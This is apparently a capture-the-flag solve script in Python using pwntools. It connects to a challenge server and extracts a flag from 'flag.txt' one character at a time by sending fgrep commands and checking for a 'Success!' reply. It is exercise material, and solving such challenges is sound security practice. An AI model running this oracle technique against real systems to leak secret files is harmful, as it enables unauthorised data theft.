import pwn
import string

sh = pwn.remote('tasks.kksctf.ru', 30010)
r = sh.recvuntil("$ ")

alphabet = string.ascii_letters + '_0123456789?}{'
flag = ''

behind = True
while behind == True:
    behind = False
    for i in range(len(alphabet)):
        msg = 'fgrep -c "{}" "flag.txt"'.format((flag+alphabet[i]))
        sh.sendline(msg)
        response = sh.recvuntil('$ ')
        if "Success!" in response.decode():
            flag += alphabet[i]
            behind = True
            print(flag)
            break
    
front = True
while front == True:
    front = False
    for i in range(len(alphabet)):
        msg = 'fgrep -c "{}" "flag.txt"'.format((alphabet[i]+flag))
        sh.sendline(msg)
        response1 = sh.recvuntil('$ ')
        if "Success!" in response1.decode():
            flag = alphabet[i] + flag
            front = True
            print(flag)
            break